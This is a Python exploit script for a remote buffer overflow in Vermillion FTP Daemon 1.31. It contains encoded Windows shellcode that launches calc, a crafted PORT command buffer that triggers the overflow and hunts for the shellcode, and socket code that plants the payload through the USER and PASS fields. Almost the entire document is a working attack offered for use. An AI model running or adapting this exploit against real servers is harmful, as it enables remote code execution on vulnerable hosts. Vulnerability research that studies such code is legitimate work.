# Exploit Title: Vermillion FTP Deamon Remote BOF Exploit
# Date: 29/01/2010
# Author: Dz_attacker
# Software Link: http://www.softsea.com/download/Vermillion-FTP-Daemon.html
# Version: 1.31
# Tested on: Windows xp sp3
# Code :

#!/usr/bin/python

#[+] Original : http://www.global-evolution.info/news/files/vftpd/vftpd.txt

import socket
import sys
import time

if (len(sys.argv) != 2):
print "+++++++++++++++++++++++++++++++++++++++++++++++++"
print "[+] Vftpd Remote BOF Exploit"
print "[+] Exploit By Dz_attacker (dz_attacker@hotmail.fr)"
print "[+] Usage : %s <target_ip>" %sys.argv[0]
print "+++++++++++++++++++++++++++++++++++++++++++++++++\n"
sys.exit(0)



# win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x5a\x32\x37\x44\x5a\x32\x37\x90\x90\x90\x90\x90\x90\x90\x90"
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc1"
"\xbc\xec\x76\x83\xeb\xfc\xe2\xf4\x3d\x54\xa8\x76\xc1\xbc\x67\x33"
"\xfd\x37\x90\x73\xb9\xbd\x03\xfd\x8e\xa4\x67\x29\xe1\xbd\x07\x3f"
"\x4a\x88\x67\x77\x2f\x8d\x2c\xef\x6d\x38\x2c\x02\xc6\x7d\x26\x7b"
"\xc0\x7e\x07\x82\xfa\xe8\xc8\x72\xb4\x59\x67\x29\xe5\xbd\x07\x10"
"\x4a\xb0\xa7\xfd\x9e\xa0\xed\x9d\x4a\xa0\x67\x77\x2a\x35\xb0\x52"
"\xc5\x7f\xdd\xb6\xa5\x37\xac\x46\x44\x7c\x94\x7a\x4a\xfc\xe0\xfd"
"\xb1\xa0\x41\xfd\xa9\xb4\x07\x7f\x4a\x3c\x5c\x76\xc1\xbc\x67\x1e"
"\xfd\xe3\xdd\x80\xa1\xea\x65\x8e\x42\x7c\x97\x26\xa9\xc2\x34\x94"
"\xb2\xd4\x74\x88\x4b\xb2\xbb\x89\x26\xdf\x8d\x1a\xa2\xbc\xec\x76")

stage = "92060006,92080001,92120010,92150015,92000015,92040002,"
stage += "92050002,92060010,92000002,92050008,92120013,92020014,"
stage += "92030012,92000005,92050010,92070004,92140015,92110008,"
stage += "92040004,92050010,92030002,92030007,92080011,92150010,"
stage += "92100015,92070005,92140010,92100015,92070005,92140007,"
stage += "92150015,92140007,"

payload = shellcode + "\x44"*(500-len(shellcode))

buffer = "92040001,"*11
buffer += stage
buffer += "92020004,"
buffer += "92150011,"
buffer += "92010002,"
buffer += "92000000,"
buffer += "92020013,"
buffer += "92070000,"
buffer += "92040002,"
buffer += "92000000,"
buffer += "2"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],21))
print "[x] Sending Shellcode..."
s.recv(1024)
s.send('USER '+payload+'\r\n')
s.recv(1024)
s.send('PASS '+payload+'\r\n')
s.recv(1024)
s.send('SYST\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.recv(1024)
s.close()

time.sleep(2)

s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((sys.argv[1],21))
print "[x] Sending Exploit..."
s2.send('PORT '+buffer+'\r\n')
s2.close()
time.sleep(2)
print "[x] Hunting the shellcode..."
time.sleep(3)
raw_input("[x] Done, press enter to quit")